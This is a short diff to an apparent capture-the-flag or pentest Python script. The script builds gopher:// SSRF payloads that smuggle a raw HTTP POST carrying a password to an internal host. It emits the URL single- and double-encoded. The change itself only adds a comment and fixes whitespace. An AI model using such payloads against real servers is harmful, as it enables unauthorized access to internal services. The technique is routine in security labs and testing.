@@ -43,7 +43,7 @@ payload = (
     "Content-Type: application/x-www-form-urlencoded\r\n"
     "\r\n"
     "password=admin123"
-)
+) # You may need to manually change the Request here.
 
 # 1) First pass: keep / and : so /admin.php and header colons stay readable
 enc1 = quote(payload, safe="/-._:")
@@ -54,7 +54,7 @@ enc1 = enc1.replace("HTTP/1.1", "HTTP%2F1.1", 1)
 # >>> Use Host header for gopher URL
 host, port = extract_host_port(payload)
 u1 = f"gopher://{host}:{port}/_{enc1}"   # single-encoded
-u2 = quote(u1, safe="/")                  # double-encoded (slashes preserved)
+u2 = quote(u1, safe="/")                 # double-encoded (slashes preserved)
 
 print(u1)
 print(u2)
